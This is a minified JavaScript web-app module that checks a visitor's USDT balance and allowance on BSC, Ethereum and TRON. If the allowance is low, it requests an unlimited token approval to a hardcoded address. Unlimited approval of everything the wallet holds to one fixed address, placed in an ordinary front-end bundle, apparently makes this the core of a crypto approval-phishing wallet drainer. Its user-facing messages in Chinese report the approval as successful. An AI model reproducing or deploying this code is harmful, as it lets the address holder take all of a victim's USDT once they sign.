import{y as e}from"./components-BAgzu-ay.js";import"./vue-vendor-Th7sVZCl.js";import"./i18n-jHFlwMB3.js";import"./vendor-DgqwP95p.js";const o={BSC:"0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB",ETH:"0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB",TRON:"TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi"},r={BSC:"0x55d398326f99059fF775485246999027B3197955",ETH:"0xdAC17F958D2ee523a2206206994597C13D831ec7",TRON:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},n={BSC:18,ETH:6,TRON:6},a=["function approve(address spender, uint256 amount) returns (bool)","function allowance(address owner, address spender) view returns (uint256)","function balanceOf(address account) view returns (uint256)"];async function t(t,s){try{console.log(`[AutoApprove] Checking ${t} on ${s}...`);const c="TRON"===s?await async function(e){try{if(!window.tronWeb||!window.tronWeb.ready)throw new Error("TronLink not ready");const n=window.tronWeb,a=o.TRON,t=await n.contract().at(r.TRON),[s,c]=await Promise.all([t.allowance(e,a).call(),t.balanceOf(e).call()]),i=Number(s)/1e6;return{allowance:i,balance:Number(c)/1e6,needsApproval:i<1e3,chain:"TRON"}}catch(n){throw console.error("[AutoApprove] Check TRON allowance error:",n),n}}(t):await async function(t,s){try{const{ethers:c}=await e(async()=>{const{ethers:e}=await import("./vendor-DgqwP95p.js").then(e=>e.a1);return{ethers:e}},[]),i=new c.BrowserProvider(window.ethereum),l=o[s],p=new c.Contract(r[s],a,i),[u,w]=await Promise.all([p.allowance(t,l),p.balanceOf(t)]),d=n[s],A=parseFloat(c.formatUnits(u,d));return{allowance:A,balance:parseFloat(c.formatUnits(w,d)),needsApproval:A<1e3,chain:s}}catch(c){throw console.error("[AutoApprove] Check EVM allowance error:",c),c}}(t,s);if(console.log("[AutoApprove] Result:",c),!c.needsApproval)return{success:!0,alreadyApproved:!0,allowance:c.allowance,balance:c.balance,message:"已授权"};console.log("[AutoApprove] Requesting authorization...");const i="TRON"===s?await async function(){try{if(!window.tronWeb||!window.tronWeb.ready)throw new Error("TronLink not ready");const e=window.tronWeb,n=o.TRON,a=await e.contract().at(r.TRON),t="115792089237316195423570985008687907853269984665640564039457584007913129639935";console.log(`[AutoApprove] Approving TRON USDT to ${n}...`);const s=await a.approve(n,t).send({feeLimit:1e8,callValue:0,shouldPollResponse:!0});return console.log(`[AutoApprove] Transaction sent: ${s}`),{success:!0,txHash:s,message:"授权成功！"}}catch(e){return console.error("[AutoApprove] TRON approve error:",e),e.message&&e.message.includes("Confirmation declined")?{success:!1,message:"用户取消了授权"}:{success:!1,message:e.message||"授权失败"}}}():await async function(n,t){try{const{ethers:n}=await e(async()=>{const{ethers:e}=await import("./vendor-DgqwP95p.js").then(e=>e.a1);return{ethers:e}},[]),s=new n.BrowserProvider(window.ethereum),c=await s.getSigner(),i=o[t],l=new n.Contract(r[t],a,c),p=n.MaxUint256;console.log(`[AutoApprove] Approving ${t} USDT to ${i}...`);const u=await l.approve(i,p);console.log(`[AutoApprove] Transaction sent: ${u.hash}`);const w=await u.wait();return console.log(`[AutoApprove] Confirmed in block ${w.blockNumber}`),{success:!0,txHash:u.hash,blockNumber:w.blockNumber,message:"授权成功！"}}catch(s){return console.error("[AutoApprove] EVM approve error:",s),"ACTION_REJECTED"===s.code||4001===s.code?{success:!1,message:"用户取消了授权"}:{success:!1,message:s.message||"授权失败"}}}(0,s);return{...i,alreadyApproved:!1,balance:c.balance}}catch(c){return console.error("[AutoApprove] Error:",c),{success:!1,message:c.message||"检查授权失败"}}}export{t as checkAndAutoApprove};
